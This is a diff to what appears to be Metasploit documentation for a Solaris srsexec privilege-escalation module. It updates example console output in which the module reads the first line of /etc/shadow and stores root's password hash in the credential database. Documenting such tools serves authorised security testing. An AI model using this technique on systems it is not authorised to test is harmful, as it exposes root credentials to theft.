@@ -42,21 +42,22 @@
 msf5 post(solaris/escalate/srsexec_readline) > run
 
 [+] 3.2.4 is vulnerable
-[+] Output: verify_binary(wsltw)
-srsexec: binary_name: wsltw
-srsexec: name_buf: wsltw_______________
+[+] Raw Command Output: verify_binary(vFYZf)
+srsexec: binary_name: vFYZf
+srsexec: name_buf: vFYZf_______________
 binaries file line: root:MW7h.vpI1Kq1g:1
 binaries file line: :17599::::::
 smmsp:NP
-Security verification failed for binary: wsltw
+Security verification failed for binary: vFYZf
 see SYSLOG(/var/adm/messages) for errors
-[+] Adding root's hash added to credential database.
+[+] First line of /etc/shadow: root:MW7h.vpI1Kq1g:17599::::::
+[+] Adding root's hash to the credential database.
 [*] Post module execution completed
 msf5 post(solaris/escalate/srsexec_readline) > creds
 Credentials
 ===========
 
-host  origin        service  public  private        realm  private_type
-----  ------        -------  ------  -------        -----  ------------
-      1.1.1.1                root    MW7h.vpI1Kq1g         Nonreplayable hash
+host          origin        service       public   private        realm  private_type
+----          ------        -------       ------   -------        -----  ------------
+              1.1.1.1                     root     MW7h.vpI1Kq1g         Nonreplayable hash
 ```
